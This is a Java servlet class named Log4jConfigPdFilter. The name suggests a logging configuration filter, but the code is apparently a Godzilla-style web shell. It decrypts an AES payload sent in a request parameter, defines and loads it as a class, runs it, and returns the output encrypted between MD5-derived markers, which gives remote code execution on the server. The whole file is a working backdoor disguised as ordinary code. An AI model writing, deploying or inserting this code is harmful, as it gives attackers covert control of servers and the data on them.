package com.filter;

import javax.crypto.Cipher;
import javax.crypto.spec.SecretKeySpec;
import javax.servlet.http.HttpServletRequest;
import javax.servlet.http.HttpServletResponse;
import javax.servlet.http.HttpSession;
import java.io.ByteArrayOutputStream;
import java.math.BigInteger;
import java.security.MessageDigest;
import java.util.Map;
import java.util.concurrent.ConcurrentHashMap;

public class Log4jConfigPdFilter extends ClassLoader{

    private static final Map<ClassLoader, Log4jConfigPdFilter> CACHE = new ConcurrentHashMap<>();

    public static Log4jConfigPdFilter getInstance(ClassLoader loader) {
        return CACHE.computeIfAbsent(loader, k -> new Log4jConfigPdFilter());
    }

    public static String md5;
    static String pass = "pass";
    // key 的实际值需要md5之后，截取前16位，详细见x()解密函数
//    static String key = "8cf02d45e78e88a4";
    static String key = md5("Anbjntgvpph").substring(0, 16).toLowerCase();

    public Log4jConfigPdFilter() {
    }

    public Log4jConfigPdFilter(ClassLoader z) {
        super(z);
        md5 = md5(pass + key);
    }



    public byte[] x(byte[] s, boolean m) {
        try {
            Cipher c = Cipher.getInstance("AES");
            c.init(m ? 1 : 2, new SecretKeySpec(key.getBytes(), "AES"));
            return c.doFinal(s);
        } catch (Exception var4) {
            return null;
        }
    }

    public static String md5(String s) {
        String ret = null;

        try {
            MessageDigest m = MessageDigest.getInstance("MD5");
            m.update(s.getBytes(), 0, s.length());
            ret = (new BigInteger(1, m.digest())).toString(16).toUpperCase();
        } catch (Exception var3) {
        }

        return ret;
    }

    public static String base64Encode(byte[] bs) throws Exception {
        String value = null;

        try {
            Class base64 = Class.forName("java.util.Base64");
            Object Encoder = base64.getMethod("getEncoder", (Class[])null).invoke(base64, (Object[])null);
            value = (String)Encoder.getClass().getMethod("encodeToString", byte[].class).invoke(Encoder, bs);
        } catch (Exception var6) {
            try {
                Class base64 = Class.forName("sun.misc.BASE64Encoder");
                Object Encoder = base64.newInstance();
                value = (String)Encoder.getClass().getMethod("encode", byte[].class).invoke(Encoder, bs);
            } catch (Exception var5) {
            }
        }

        return value;
    }


    public Class Q(byte[] cb) {
        return super.defineClass(cb, 0, cb.length);
    }

    public void execute(HttpServletRequest request, HttpServletResponse response) {
        System.out.println("into com.filter.Log4jConfigPdFilter.execute()");
        System.out.println("key = " + key);
        try {
            HttpSession session = request.getSession();
            byte[] data = this.base64Decode(request.getParameter(pass));
            data = this.x(data, false);
            if (session.getAttribute("payload") == null) {
                session.setAttribute("payload", (new Log4jConfigPdFilter(this.getClass().getClassLoader())).Q(data));
            } else {
                request.setAttribute("parameters", data);
                ByteArrayOutputStream arrOut = new ByteArrayOutputStream();

                Object f;
                try {
                    f = ((Class)session.getAttribute("payload")).newInstance();
                } catch (IllegalAccessException | InstantiationException e) {
                    throw new RuntimeException(e);
                }
                f.equals(arrOut);
                f.equals(request);
                javax.servlet.ServletOutputStream out = response.getOutputStream();
                out.write(md5.substring(0, 16).getBytes(java.nio.charset.StandardCharsets.UTF_8));
                f.toString();
                out.write(base64Encode(this.x(arrOut.toByteArray(), true)).getBytes(java.nio.charset.StandardCharsets.UTF_8));
                out.write(md5.substring(16).getBytes(java.nio.charset.StandardCharsets.UTF_8));
                out.flush();
            }
        } catch (Exception var12) {
        }

    }


    public byte[] base64Decode(String str) throws Exception {
        try {
            Class clazz = Class.forName("sun.misc.BASE64Decoder");
            return (byte[])clazz.getMethod("decodeBuffer", String.class).invoke(clazz.newInstance(), str);
        } catch (Exception var5) {
            Class clazz = Class.forName("java.util.Base64");
            Object decoder = clazz.getMethod("getDecoder").invoke((Object)null);
            return (byte[])decoder.getClass().getMethod("decode", String.class).invoke(decoder, str);
        }
    }

    static {
        md5 = md5(pass + key);
    }
}
